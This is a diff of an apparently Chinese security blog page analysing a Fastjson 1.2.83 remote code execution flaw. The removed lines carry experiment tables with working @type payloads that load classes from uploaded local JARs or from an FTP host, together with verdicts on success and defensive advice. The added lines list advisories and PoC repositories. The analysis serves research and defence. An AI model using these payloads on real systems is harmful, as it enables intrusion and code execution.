+<td>腾讯云安全中心</td>
+<td>2026-07-23</td>
+<td><a target="_blank" rel="noopener" href="https://cloud.tencent.com/announce/detail/2381">https://cloud.tencent.com/announce/detail/2381</a></td>
 </tr>
 <tr>
-<td><strong>阴性对照</strong></td>
-<td>Linux JDK 8 + Tomcat FatJar</td>
-<td><code>java.lang.String</code>（良性）</td>
-<td>NO MARKER，无出站请求</td>
-<td><strong>阴性对照通过</strong></td>
+<td>[3]</td>
+<td>Fastjson 1.2.83 远程代码执行漏洞安全风险通告 (QVD-2026-43021)</td>
+<td>奇安信 CERT</td>
+<td>2026-07-20</td>
+<td><a target="_blank" rel="noopener" href="https://www.secrss.com/articles/92316">https://www.secrss.com/articles/92316</a></td>
+</tr>
+<tr>
+<td>[4]</td>
+<td>奇安信 CERT 第二次更新：已复现</td>
+<td>奇安信 CERT (gm7.org 转载)</td>
+<td>2026-07-21</td>
+<td><a target="_blank" rel="noopener" href="https://www.gm7.org/archives/132224">https://www.gm7.org/archives/132224</a></td>
+</tr>
+<tr>
+<td>[10]</td>
+<td>关于 Fastjson 1.2.83 远程代码执行漏洞的安全公告</td>
+<td>大连理工大学</td>
+<td>2026-07-21</td>
+<td><a target="_blank" rel="noopener" href="https://wlaq.dlut.edu.cn/info/1097/8405.htm">https://wlaq.dlut.edu.cn/info/1097/8405.htm</a></td>
+</tr>
+<tr>
+<td>[11]</td>
+<td>FASTJSON 1.2.83 版本发布（安全修复）</td>
+<td>GitHub &#x2F; alibaba&#x2F;fastjson Releases</td>
+<td>2022-05-23</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/releases">https://github.com/alibaba/fastjson/releases</a></td>
 </tr>
 </tbody></table>
-<h3 id="8-1-E4：Tomcat-内嵌容器（R3-R3b）"><a href="#8-1-E4：Tomcat-内嵌容器（R3-R3b）" class="headerlink" title="8.1 E4：Tomcat 内嵌容器（R3&#x2F;R3b）"></a>8.1 E4：Tomcat 内嵌容器（R3&#x2F;R3b）</h3><table>
+<h4 id="技术分析与原始研究"><a href="#技术分析与原始研究" class="headerlink" title="技术分析与原始研究"></a>技术分析与原始研究</h4><table>
 <thead>
 <tr>
-<th>子组</th>
-<th>JDK</th>
-<th>payload</th>
-<th>fastjson 响应</th>
-<th>攻击端观察</th>
+<th>编号</th>
+<th>标题</th>
+<th>作者&#x2F;机构</th>
+<th>日期</th>
+<th>URL</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>E4.1</td>
-<td>8</td>
-<td>A（<code>http:..</code> 直载）</td>
-<td><code>autoType is not support</code></td>
-<td>HEAD + GET <code>/a.class</code>（3 次，transport 成功）</td>
+<td>[5]</td>
+<td>2026年了，核弹还是fastjson——fastjson1.2.83 RCE是怎么回事？</td>
+<td>LoRexxar</td>
+<td>2026-07-21</td>
+<td><a target="_blank" rel="noopener" href="https://lorexxar.cn/2026/07/21/fs1-2-83rce/">https://lorexxar.cn/2026/07/21/fs1-2-83rce/</a></td>
 </tr>
 <tr>
-<td>E4.2</td>
-<td>17</td>
-<td>A（<code>http:..</code> 直载）</td>
-<td><code>autoType is not support</code></td>
-<td>HEAD + GET <code>/a.class</code>（3 次，预期内：JDK 9+ verifier 拒绝 <code>//</code>）</td>
+<td>[7]</td>
+<td>Fastjson 1.2.83 RCE漏洞分析（AI）</td>
+<td>9eek</td>
+<td>2026-07-22</td>
+<td><a target="_blank" rel="noopener" href="https://www.cnblogs.com/9eek/p/21793398">https://www.cnblogs.com/9eek/p/21793398</a></td>
 </tr>
 <tr>
-<td>E4.3</td>
-<td>8</td>
-<td>B（jar:http: 两阶段 fd 枚举）</td>
-<td>超时未完成</td>
-<td>大量 GET <code>/x</code>（JAR 下载触发，数组过大导致 Tomcat CL 逐元素委派累积超时 &gt;60s）</td>
+<td>[8]</td>
+<td>Fastjson 1.2.83 &quot;Gadget-Free&quot; 漏洞（0day）深度分析与防御指南</td>
+<td>GCSA (Foresight News)</td>
+<td>2026-07-21</td>
+<td><a target="_blank" rel="noopener" href="https://foresightnews.pro/article/detail/98990">https://foresightnews.pro/article/detail/98990</a></td>
+</tr>
+<tr>
+<td>[13]</td>
+<td>Fastjson 1.2.83 @JSONType Gadget-free RCE 分析与复现</td>
+<td>江左盟宗主 &#x2F; FreeBuf</td>
+<td>2026-07-22</td>
+<td><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/491546.html">https://www.freebuf.com/articles/web/491546.html</a></td>
+</tr>
+<tr>
+<td>[16]</td>
+<td>Fastjson 1.2.83 漏洞深度技术报告（完整版）</td>
+<td>GCSA</td>
+<td>2026-07-21</td>
+<td>同 [8] 完整版；内部编号 FJ-GETRESOURCE-RCE</td>
+</tr>
+<tr>
+<td>[17]</td>
+<td>Fastjson 1.2.83 漏洞 AI 可发现性与可利用性分析</td>
+<td>综合多源分析</td>
+<td>2026-07-25</td>
+<td>本文收集整理，基于多源公开资料综合</td>
 </tr>
 </tbody></table>
-<p><strong>裁决</strong>：http:&#x2F;&#x2F; 直载型名称在 Tomcat CL 拓扑下死于 checkAutoType（非 Tomcat CL 阻断）。jar:http:&#x2F;&#x2F; + Exception 后缀 + fd 两阶段链在机制上成立（PCL&#x3D;LaunchedURLClassLoader 可完成 getResourceAsStream + jar_cache 落盘；jar:file:&#x2F;&#x2F; 暂存在 Tomcat JDK17 下已被 E1 对照证实可通），但 E4.3 因 39 元素数组在 Tomcat 逐元素委派下超时而未跑通全链。详见 §5 R3&#x2F;R3b 分析。</p>
-<h3 id="8-2-E1：Windows-本地-staging（R4b）"><a href="#8-2-E1：Windows-本地-staging（R4b）" class="headerlink" title="8.2 E1：Windows 本地 staging（R4b）"></a>8.2 E1：Windows 本地 staging（R4b）</h3><table>
+<h4 id="漏洞预警与企业排查"><a href="#漏洞预警与企业排查" class="headerlink" title="漏洞预警与企业排查"></a>漏洞预警与企业排查</h4><table>
 <thead>
 <tr>
-<th>环境</th>
-<th>payload</th>
-<th>结果</th>
+<th>编号</th>
+<th>标题</th>
+<th>作者&#x2F;机构</th>
+<th>日期</th>
+<th>URL</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>Windows 11 + JDK 17（Temurin）+ Jetty FatJar</td>
-<td><code>&#123;&quot;@type&quot;:&quot;jar:file:.C:.temp.up.pg!.p.Exception&quot;&#125;</code></td>
-<td>marker: <code>jar:file:/C:/temp/up/pg!/p/Exception</code>，CL&#x3D;<code>LaunchedURLClassLoader</code></td>
+<td>[6]</td>
+<td>Fastjson 1.2.83 默认配置下的远程代码执行漏洞</td>
+<td>Mrxn</td>
+<td>2026-07-20</td>
+<td><a target="_blank" rel="noopener" href="https://mrxn.net/jswz/fastjson-1-2-83-default-config-rce.html">https://mrxn.net/jswz/fastjson-1-2-83-default-config-rce.html</a></td>
+</tr>
+<tr>
+<td>[9]</td>
+<td>Fastjson 远程代码执行漏洞预警：1.2.68–1.2.83 受影响</td>
+<td>猎户攻防实验室 (gm7.org)</td>
+<td>2026-07-20</td>
+<td><a target="_blank" rel="noopener" href="https://www.gm7.org/archives/131981">https://www.gm7.org/archives/131981</a></td>
+</tr>
+<tr>
+<td>[12]</td>
+<td>【PoC已公开】Fastjson 再爆 RCE 高危漏洞，无需任何第三方 Gadget！</td>
+<td>CSDN</td>
+<td>2026-07-21</td>
+<td><a target="_blank" rel="noopener" href="https://blog.csdn.net/lingggggaaaa/article/details/163064101">https://blog.csdn.net/lingggggaaaa/article/details/163064101</a></td>
+</tr>
+<tr>
+<td>[14]</td>
+<td>Fastjson 1.2.83 autoType 通杀 RCE 研究</td>
+<td>Detect-DefenseLab</td>
+<td>2026-07-24–25</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/Detect-DefenseLab/fastjson-1.2.83-rce-detection">https://github.com/Detect-DefenseLab/fastjson-1.2.83-rce-detection</a></td>
+</tr>
+<tr>
+<td>[15]</td>
+<td>Fastjson 1.2.83无Gadget RCE实战复现+企业全量排查加固</td>
+<td>CSDN</td>
+<td>2026-07-23</td>
+<td><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42376192/article/details/163121562">https://blog.csdn.net/weixin_42376192/article/details/163121562</a></td>
 </tr>
 </tbody></table>
-<p><strong>裁决</strong>：<strong>R4b 证实——RCE 成功</strong>。Windows + JDK 9+ 无需出网、无需 <code>/proc</code>，只需可预测路径上传。</p>
-<h3 id="8-3-E2：Linux-无出网-staging（R6）"><a href="#8-3-E2：Linux-无出网-staging（R6）" class="headerlink" title="8.3 E2：Linux 无出网 staging（R6）"></a>8.3 E2：Linux 无出网 staging（R6）</h3><table>
+<h4 id="PoC-仓库（-P1-–-P8-）"><a href="#PoC-仓库（-P1-–-P8-）" class="headerlink" title="PoC 仓库（[P1]–[P8]）"></a>PoC 仓库（[P1]–[P8]）</h4><table>
 <thead>
 <tr>
-<th>环境</th>
-<th>payload</th>
-<th>结果</th>
+<th>编号</th>
+<th>仓库</th>
+<th>状态</th>
+<th>说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>Linux JDK 17 + Jetty FatJar + 网络完全隔离（iptables DROP ALL outbound）</td>
-<td><code>&#123;&quot;@type&quot;:&quot;jar:file:.tmp.uploads.stage!.p.Exception&quot;&#125;</code></td>
-<td>marker: <code>jar:file:/tmp/uploads/stage!/p/Exception</code>，CL&#x3D;<code>LaunchedURLClassLoader</code></td>
+<td>[P1]</td>
+<td>github.com&#x2F;wouijvziqy&#x2F;Fastjson-JsonType-RCE-PoC</td>
+<td>❌ 已删除</td>
+<td>最早公开 PoC[5]</td>
+</tr>
+<tr>
+<td>[P2]</td>
+<td>github.com&#x2F;ThanatosXingYu&#x2F;2026FastjsonPoC</td>
+<td>✅ 在线</td>
+<td>完整构建脚本 + 复现步骤[5]</td>
+</tr>
+<tr>
+<td>[P3]</td>
+<td>github.com&#x2F;seklure&#x2F;fastjson-jsontype-rce-poc</td>
+<td>✅ 在线</td>
+<td>轻量 PoC</td>
+</tr>
+<tr>
+<td>[P4]</td>
+<td>github.com&#x2F;dinosn&#x2F;fastjson-jsontype-rce-lab</td>
+<td>✅ 在线</td>
+<td>Docker 靶场环境 [6]</td>
+</tr>
+<tr>
+<td>[P5]</td>
+<td>github.com&#x2F;fzypl&#x2F;Fastjson-JsonType-RCE-Demo</td>
+<td>✅ 在线</td>
+<td>演示 Demo</td>
+</tr>
+<tr>
+<td>[P6]</td>
+<td>github.com&#x2F;zg-sec&#x2F;fastjson-json-type-rce</td>
+<td>✅ 在线</td>
+<td>诸葛安全版 PoC</td>
+</tr>
+<tr>
+<td>[P7]</td>
+<td>github.com&#x2F;Detect-DefenseLab&#x2F;fastjson-1.2.83-rce-detection</td>
+<td>✅ 在线</td>
+<td>全版本通杀 + 多层防御 [14]</td>
+</tr>
+<tr>
+<td>[P8]</td>
+<td>github.com&#x2F;YoungBear&#x2F;FastjsonPoc</td>
+<td>✅ 在线</td>
+<td>通用 PoC 代码</td>
 </tr>
 </tbody></table>
-<p><strong>裁决</strong>：<strong>R6 证实——RCE 成功，全程零出站连接</strong>。隔离验证通过。</p>
-<h3 id="8-4-E3：Windows-UNC-SMB（R7）"><a href="#8-4-E3：Windows-UNC-SMB（R7）" class="headerlink" title="8.4 E3：Windows UNC&#x2F;SMB（R7）"></a>8.4 E3：Windows UNC&#x2F;SMB（R7）</h3><table>
+<h4 id="一手资料"><a href="#一手资料" class="headerlink" title="一手资料"></a>一手资料</h4><table>
 <thead>
 <tr>
-<th>环境</th>
-<th>payload</th>
-<th>结果</th>
+<th>编号</th>
+<th>链接</th>
+<th>说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>Windows 11 + JDK 8（TencentKona）+ Jetty FatJar；攻击端 impacket smbserver</td>
-<td><code>&#123;&quot;@type&quot;:&quot;jar:file:..2887043830.share.x!.p.Exception&quot;&#125;</code></td>
-<td><strong>NO MARKER</strong>，SMB 服务器零连接，verbose_class.log 无异常</td>
+<td>[S1]</td>
+<td><a target="_blank" rel="noopener" href="https://fearsoff.org/cn/research/fastjson-1-2-83-rce">https://fearsoff.org/cn/research/fastjson-1-2-83-rce</a></td>
+<td>原作者 Kirill Firsov 完整研究文档</td>
+</tr>
+<tr>
+<td>[S2]</td>
+<td><a target="_blank" rel="noopener" href="https://x.com/k_firsov/status/2078872293745570032">https://x.com/k_firsov/status/2078872293745570032</a></td>
+<td>原作者 Twitter 首次披露[5]</td>
 </tr>
 </tbody></table>
-<p><strong>裁决</strong>：<strong>R7 证伪——transport 未建立</strong>。JDK 的 <code>file:</code> URL 处理不穿透到 SMB 协议栈（详见 §5 R7 分析）。</p>
-<h3 id="8-5-E5：FTP-传输通道（R8）"><a href="#8-5-E5：FTP-传输通道（R8）" class="headerlink" title="8.5 E5：FTP 传输通道（R8）"></a>8.5 E5：FTP 传输通道（R8）</h3><table>
-<thead>
-<tr>
-<th>环境</th>
-<th>payload</th>
-<th>结果</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Linux JDK 8 + Jetty FatJar；攻击端 pyftpdlib FTP 服务</td>
-<td><code>&#123;&quot;@type&quot;:&quot;jar:ftp:..2887647242:2121.x!.p.Exception&quot;&#125;</code></td>
-<td>marker: <code>jar:ftp://2887647242:2121/x!/p/Exception</code>，CL&#x3D;<code>LaunchedURLClassLoader</code></td>
-</tr>
-</tbody></table>
-<p><strong>裁决</strong>：<strong>R8 证实——RCE 成功</strong>。JDK 原生 FTP handler 走 <code>URLJarFile.retrieve</code> 同一路径，与 HTTP 等价。防御含义：仅监控 HTTP 出站的防火墙&#x2F;WAF 对 FTP 通道无效。</p>
-<h3 id="8-6-汇总与修正"><a href="#8-6-汇总与修正" class="headerlink" title="8.6 汇总与修正"></a>8.6 汇总与修正</h3><table>
-<thead>
-<tr>
-<th>实验</th>
-<th>原假设</th>
-<th>结果</th>
-<th>矩阵修正</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>E1</td>
-<td>R4b 假设</td>
-<td><strong>证实</strong></td>
-<td>→ 实证（E1, 2026-07-26）</td>
-</tr>
-<tr>
-<td>E2</td>
-<td>R6 假设</td>
-<td><strong>证实</strong></td>
-<td>→ 实证（E2, 2026-07-26）</td>
-</tr>
-<tr>
-<td>E3</td>
-<td>R7 RCE&#x2F;NTLM 假设</td>
-<td><strong>证伪</strong></td>
-<td>→ 死格子（transport 未建立，E3）；移除&quot;NTLM hash 降级收益&quot;</td>
-</tr>
-<tr>
-<td>E4</td>
-<td>R3&#x2F;R3b 推断</td>
-<td><strong>未决</strong>（SSRF 确认，RCE 未达成）</td>
-<td>→ 见 §5 更新分析</td>
-</tr>
-<tr>
-<td>E5</td>
-<td>R8 假设</td>
-<td><strong>证实</strong></td>
-<td>→ 实证（E5, 2026-07-26）</td>
-</tr>
-</tbody></table>
-<p><strong>修正规则执行记录</strong>：E3 证伪后已移除 §4 矩阵中 R7 的&quot;RCE?&quot;标注和&quot;NTLM hash 降级&quot;描述。E5 证实后 §6.1 防御效力表已补充 FTP 通道说明。</p>
-<hr>
-<h2 id="9-结语：这个漏洞教会我们什么"><a href="#9-结语：这个漏洞教会我们什么" class="headerlink" title="9. 结语：这个漏洞教会我们什么"></a>9. 结语：这个漏洞教会我们什么</h2><p>回看整条链，没有一环是&quot;新&quot;的：<code>replace(&#39;.&#39;, &#39;/&#39;)</code> 从 autoType 时代第一天就在；Spring 的 jar Handler 宽容解析存在了十几年；<code>URLJarFile.retrieve</code> 的落盘行为和 <code>/proc/self/fd</code> 更是 Unix 的老古董；JDK 9 收紧类名校验时甚至没人把它当安全修复。每一环单独看都是合理设计，甚至是防御性设计。漏洞只出现在它们被按特定顺序拼接之后——fastjson 替攻击者按下了那个拼接开关。</p>
-<p>这正是为什么黑&#x2F;白名单、版本升级、WAF 这些&quot;针对已知链环节&quot;的防御会系统性失效：它们防御的是<strong>链路上的点</strong>，而漏洞住在<strong>点与点之间的缝隙</strong>里。有效的防御只有两类——斩断信任源头（SafeMode &#x2F; noneautotype，在信任建立之前拒绝），或拆除缝隙本身的环境前提（出网管控 + 无 staging 面）。至于&quot;语义缝隙&quot;为什么能成为一个可操作的漏洞分析框架、它和 desync &#x2F; weird machine 等相邻概念的关系，是中篇的主题。</p>
+<blockquote>
+<p><strong>本文引用说明</strong>：正文方括号数字引用（如 [5][8]）对应上表编号。</p>
+</blockquote>
 
     </div>
 
     
+      <section class="related-posts">
+        <h2 class="related-posts__title">~/related</h2>
+        <div class="related-posts__list">
+          
+            <a class="related-posts__item" href="/2026/07/26/fastjson-1.2.83-rce-part2/">
+              <strong>Fastjson 1.2.83 RCE（中）：如何生产 Hacking Trick</strong>
+              <span>2026-07-26</span>
+            </a>
+          
+        </div>
+      </section>
+    
 
     <nav class="post-nav" aria-label="相邻文章">
       
-        <span></span>
+        <a href="/2026/07/26/fastjson-1.2.83-rce-part2/">
+          <span>上一篇</span>
+          <strong>Fastjson 1.2.83 RCE（中）：如何生产 Hacking Trick</strong>
+        </a>
       
       
         <a href="/2026/07/22/llm-decomposition-jailbreak/">
@@ -797,7 +610,7 @@
   <input id="search-input" type="search" autocomplete="off" placeholder="输入标题、标签或分类">
   <p id="search-status">输入关键词开始搜索。</p>
   <ol id="search-results"></ol>
-  <script type="application/json" id="search-data">[{"title":"Fastjson 1.2.83 RCE（上）：漏洞实例与利用完整分析","url":"/2026/07/26/fastjson-1.2.83-rce-part1/","date":"2026-07-26","tags":["Fastjson","RCE","Java","漏洞分析","Sematic Gap","Security"]},{"title":"越过护栏：LLM分解攻击","url":"/2026/07/22/llm-decomposition-jailbreak/","date":"2026-07-22","tags":["LLM","安全","Jailbreak","AI"]},{"title":"Agent 的人月神话：执行便宜，交付很贵","url":"/2026/07/05/agent-mythical-man-month/","date":"2026-07-05","tags":["Coding Agent","Software Engineering","Mythical Man-Month","AI"]},{"title":"MopMonk Agent：漏洞复现里的任务记忆","url":"/2026/07/01/mopmonk-agent-blog/","date":"2026-07-01","tags":["Coding Agent","CyberGym","Vulnerability","AI"]},{"title":"看不见的模型漂移：用 Agent 日志观察质量风险","url":"/2026/06/29/model-provider-quality-from-usage/","date":"2026-06-29","tags":["AgentMeter","LLM","Coding Agent","AI"]},{"title":"网络安全杂谈：从入门到进阶","url":"/2024/04/14/learn-hacking/","date":"2024-04-14","tags":["杂谈"]},{"title":"nmap 小传：开源端扫三十年","url":"/2024/04/05/nmap-history/","date":"2024-04-05","tags":["杂谈"]},{"title":"端扫算法优化：随机化篇","url":"/2024/02/08/port-scan-random-algo/","date":"2024-02-08","tags":["测绘"]},{"title":"大范围IP端口扫描优化：内核篇","url":"/2024/01/30/large-scale-port-scan-optimize-kernel-perspective/","date":"2024-01-30","tags":["测绘"]},{"title":"聊聊Linux进程参数变形与隐藏","url":"/2024/01/21/arg-hide/","date":"2024-01-21","tags":["渗透测试"]},{"title":"服务识别方案探索：单TCP流识别","url":"/2023/11/25/single-tcp-service-probe/","date":"2023-11-25","tags":["测绘"]},{"title":"聊聊RDAP协议","url":"/2023/10/08/rdap/","date":"2023-10-08","tags":["protocol"]},{"title":"基于时序的泛解析域名判断","url":"/2023/07/26/wildcard-dns/","date":"2023-07-26","tags":["DNS","测绘"]},{"title":"Ja3：计算原理、应用场景与指纹伪造","url":"/2023/07/08/ja3proxy/","date":"2023-07-08","tags":["tls"]},{"title":"全网测绘的成本探究","url":"/2023/06/17/scan-cost/","date":"2023-06-17","tags":[]},{"title":"攻击面测绘：浅谈自研端扫的必要性","url":"/2023/05/17/why-nmap-not-work/","date":"2023-05-17","tags":["测绘"]},{"title":"浅谈IP-地理位置映射关系构建","url":"/2023/02/12/ip-geolocation/","date":"2023-02-12","tags":[]},{"title":"一次Python TLS适配出错的调试过程","url":"/2022/12/03/python-ssl-debug/","date":"2022-12-03","tags":["python"]},{"title":"网络空间测绘从1到2：从单机到规模化测绘","url":"/2022/10/25/cyberscan/","date":"2022-10-25","tags":["web","测绘"]},{"title":"性能优先的隐忧：浅谈DNS的不可用性","url":"/2021/08/21/unreliable-dns/","date":"2021-08-21","tags":["DNS","Network"]},{"title":"基于用户态虚拟化的物联网设备仿真方法","url":"/2021/07/09/uemu/","date":"2021-07-09","tags":["虚拟化","IoT"]},{"title":"一种基于AFL测试网络服务程序的小技巧","url":"/2020/12/18/aflnw/","date":"2020-12-18","tags":["AFL","Fuzz"]},{"title":"Usenix 2020 P²IM 论文阅读笔记","url":"/2020/07/04/2020-7-4-p2im-reading-notes/","date":"2020-07-04","tags":["论文阅读"]},{"title":"CVE-2020-8617 Bind9 DOS 漏洞","url":"/2020/07/01/2020-7-1-cve-2020-8617/","date":"2020-07-01","tags":["CVE"]},{"title":"CVE-2019-5096 GoAhead Double Free 漏洞分析","url":"/2020/06/30/cve-2019-5096/","date":"2020-06-30","tags":["CVE"]},{"title":"Python 进程、线程与协程","url":"/2020/06/15/python-coroutine-thread-and-process/","date":"2020-06-15","tags":["Python","Programing"]},{"title":"基于QEMU和binfmt-misc透明运行不同架构程序","url":"/2020/04/14/transparently-running-binaries-from-any-architecture-in-linux-with-qemu-and-binfmt-misc/","date":"2020-04-14","tags":["QEMU","工具","Bin"]},{"title":"语言Tricks系列之一","url":"/2020/04/13/tricks-1/","date":"2020-04-13","tags":["Tricks","Misc"]},{"title":"命令注入成因小谈","url":"/2019/10/19/cmdi/","date":"2019-10-19","tags":["Command Injection","Web"]},{"title":"浅谈Unicode设计的安全性","url":"/2019/06/18/unicode-sec-1/","date":"2019-06-18","tags":["Unicode","Misc"]},{"title":"基于污点分析的XSS漏洞辅助挖掘的一种方式","url":"/2019/06/12/xss-auto/","date":"2019-06-12","tags":["XSS","自动化","Web"]},{"title":"CVE-2019-0232：Apache Tomcat RCE漏洞分析","url":"/2019/04/20/cve-2019-0232/","date":"2019-04-20","tags":["CVE","Web"]},{"title":"Web应用代码自动化审计浅谈","url":"/2019/04/06/Web-Application-Auto-Audit/","date":"2019-04-06","tags":["自动化","Web"]},{"title":"基于Gadgets绕过XSS防御机制","url":"/2019/02/27/bypass-xss-mitigation-via-gadgets/","date":"2019-02-27","tags":["XSS","Web"]},{"title":"IDN Spoof漏洞自动化挖掘","url":"/2018/12/08/idnfuzz/","date":"2018-12-08","tags":["Unicode","Misc"]},{"title":"Unicode等价性浅谈","url":"/2018/10/29/unicode-normalization/","date":"2018-10-29","tags":["Unicode","Misc"]},{"title":"Domato - A DOM Fuzzer","url":"/2017/09/27/2017-9-27-domato-dom-fuzzer/","date":"2017-09-27","tags":["Browser","Fuzz"]},{"title":"CVE-2017-8496 Edge Type confusion","url":"/2017/08/14/2017-8-14-cve-2017-8496/","date":"2017-08-14","tags":["CVE","Misc"]},{"title":"CVE-2016-0003 Edge Type Confusion","url":"/2017/08/11/2017-8-11-cve-2016-0003/","date":"2017-08-11","tags":["CVE","Misc"]},{"title":"php unserialize()/wakeup()漏洞","url":"/2016/10/29/php-unserialize/","date":"2016-10-29","tags":["反序列化","PHP","Web"]},{"title":"sqlmap-tamper编写指南","url":"/2016/06/06/2016-6-6-sqlmap-tamper/","date":"2016-06-06","tags":["Web"]}]</script>
+  <script type="application/json" id="search-data">[{"title":"Fastjson 1.2.83 RCE（中）：如何生产 Hacking Trick","url":"/2026/07/26/fastjson-1.2.83-rce-part2/","date":"2026-07-26","tags":["Fastjson","RCE","Java","漏洞分析","安全方法论","Security"]},{"title":"Fastjson 1.2.83 RCE（上）：漏洞实例与利用完整分析","url":"/2026/07/26/fastjson-1.2.83-rce-part1/","date":"2026-07-26","tags":["Fastjson","RCE","Java","漏洞分析","Security"]},{"title":"越过护栏：LLM分解攻击","url":"/2026/07/22/llm-decomposition-jailbreak/","date":"2026-07-22","tags":["LLM","安全","Jailbreak","AI"]},{"title":"Agent 的人月神话：执行便宜，交付很贵","url":"/2026/07/05/agent-mythical-man-month/","date":"2026-07-05","tags":["Coding Agent","Software Engineering","Mythical Man-Month","AI"]},{"title":"MopMonk Agent：漏洞复现里的任务记忆","url":"/2026/07/01/mopmonk-agent-blog/","date":"2026-07-01","tags":["Coding Agent","CyberGym","Vulnerability","AI"]},{"title":"看不见的模型漂移：用 Agent 日志观察质量风险","url":"/2026/06/29/model-provider-quality-from-usage/","date":"2026-06-29","tags":["Coding Agent","AgentMeter","LLM","AI"]},{"title":"网络安全杂谈：从入门到进阶","url":"/2024/04/14/learn-hacking/","date":"2024-04-14","tags":["杂谈"]},{"title":"nmap 小传：开源端扫三十年","url":"/2024/04/05/nmap-history/","date":"2024-04-05","tags":["杂谈"]},{"title":"端扫算法优化：随机化篇","url":"/2024/02/08/port-scan-random-algo/","date":"2024-02-08","tags":["测绘"]},{"title":"大范围IP端口扫描优化：内核篇","url":"/2024/01/30/large-scale-port-scan-optimize-kernel-perspective/","date":"2024-01-30","tags":["测绘"]},{"title":"聊聊Linux进程参数变形与隐藏","url":"/2024/01/21/arg-hide/","date":"2024-01-21","tags":["渗透测试"]},{"title":"服务识别方案探索：单TCP流识别","url":"/2023/11/25/single-tcp-service-probe/","date":"2023-11-25","tags":["测绘"]},{"title":"聊聊RDAP协议","url":"/2023/10/08/rdap/","date":"2023-10-08","tags":["protocol"]},{"title":"基于时序的泛解析域名判断","url":"/2023/07/26/wildcard-dns/","date":"2023-07-26","tags":["DNS","测绘"]},{"title":"Ja3：计算原理、应用场景与指纹伪造","url":"/2023/07/08/ja3proxy/","date":"2023-07-08","tags":["tls"]},{"title":"全网测绘的成本探究","url":"/2023/06/17/scan-cost/","date":"2023-06-17","tags":[]},{"title":"攻击面测绘：浅谈自研端扫的必要性","url":"/2023/05/17/why-nmap-not-work/","date":"2023-05-17","tags":["测绘"]},{"title":"浅谈IP-地理位置映射关系构建","url":"/2023/02/12/ip-geolocation/","date":"2023-02-12","tags":[]},{"title":"一次Python TLS适配出错的调试过程","url":"/2022/12/03/python-ssl-debug/","date":"2022-12-03","tags":["python"]},{"title":"网络空间测绘从1到2：从单机到规模化测绘","url":"/2022/10/25/cyberscan/","date":"2022-10-25","tags":["web","测绘"]},{"title":"性能优先的隐忧：浅谈DNS的不可用性","url":"/2021/08/21/unreliable-dns/","date":"2021-08-21","tags":["DNS","Network"]},{"title":"基于用户态虚拟化的物联网设备仿真方法","url":"/2021/07/09/uemu/","date":"2021-07-09","tags":["虚拟化","IoT"]},{"title":"一种基于AFL测试网络服务程序的小技巧","url":"/2020/12/18/aflnw/","date":"2020-12-18","tags":["AFL","Fuzz"]},{"title":"Usenix 2020 P²IM 论文阅读笔记","url":"/2020/07/04/2020-7-4-p2im-reading-notes/","date":"2020-07-04","tags":["论文阅读"]},{"title":"CVE-2020-8617 Bind9 DOS 漏洞","url":"/2020/07/01/2020-7-1-cve-2020-8617/","date":"2020-07-01","tags":["CVE"]},{"title":"CVE-2019-5096 GoAhead Double Free 漏洞分析","url":"/2020/06/30/cve-2019-5096/","date":"2020-06-30","tags":["CVE"]},{"title":"Python 进程、线程与协程","url":"/2020/06/15/python-coroutine-thread-and-process/","date":"2020-06-15","tags":["Python","Programing"]},{"title":"基于QEMU和binfmt-misc透明运行不同架构程序","url":"/2020/04/14/transparently-running-binaries-from-any-architecture-in-linux-with-qemu-and-binfmt-misc/","date":"2020-04-14","tags":["QEMU","工具","Bin"]},{"title":"语言Tricks系列之一","url":"/2020/04/13/tricks-1/","date":"2020-04-13","tags":["Tricks","Misc"]},{"title":"命令注入成因小谈","url":"/2019/10/19/cmdi/","date":"2019-10-19","tags":["Command Injection","Web"]},{"title":"浅谈Unicode设计的安全性","url":"/2019/06/18/unicode-sec-1/","date":"2019-06-18","tags":["Unicode","Misc"]},{"title":"基于污点分析的XSS漏洞辅助挖掘的一种方式","url":"/2019/06/12/xss-auto/","date":"2019-06-12","tags":["XSS","自动化","Web"]},{"title":"CVE-2019-0232：Apache Tomcat RCE漏洞分析","url":"/2019/04/20/cve-2019-0232/","date":"2019-04-20","tags":["CVE","Web"]},{"title":"Web应用代码自动化审计浅谈","url":"/2019/04/06/Web-Application-Auto-Audit/","date":"2019-04-06","tags":["自动化","Web"]},{"title":"基于Gadgets绕过XSS防御机制","url":"/2019/02/27/bypass-xss-mitigation-via-gadgets/","date":"2019-02-27","tags":["XSS","Web"]},{"title":"IDN Spoof漏洞自动化挖掘","url":"/2018/12/08/idnfuzz/","date":"2018-12-08","tags":["Unicode","Misc"]},{"title":"Unicode等价性浅谈","url":"/2018/10/29/unicode-normalization/","date":"2018-10-29","tags":["Unicode","Misc"]},{"title":"Domato - A DOM Fuzzer","url":"/2017/09/27/2017-9-27-domato-dom-fuzzer/","date":"2017-09-27","tags":["Browser","Fuzz"]},{"title":"CVE-2017-8496 Edge Type confusion","url":"/2017/08/14/2017-8-14-cve-2017-8496/","date":"2017-08-14","tags":["CVE","Misc"]},{"title":"CVE-2016-0003 Edge Type Confusion","url":"/2017/08/11/2017-8-11-cve-2016-0003/","date":"2017-08-11","tags":["CVE","Misc"]},{"title":"php unserialize()/wakeup()漏洞","url":"/2016/10/29/php-unserialize/","date":"2016-10-29","tags":["反序列化","PHP","Web"]},{"title":"sqlmap-tamper编写指南","url":"/2016/06/06/2016-6-6-sqlmap-tamper/","date":"2016-06-06","tags":["Web"]}]</script>
 </dialog>
 
     <!-- 猫猫糕 —— 阮·梅造物（崩坏：星穹铁道 / 开拓者款） -->
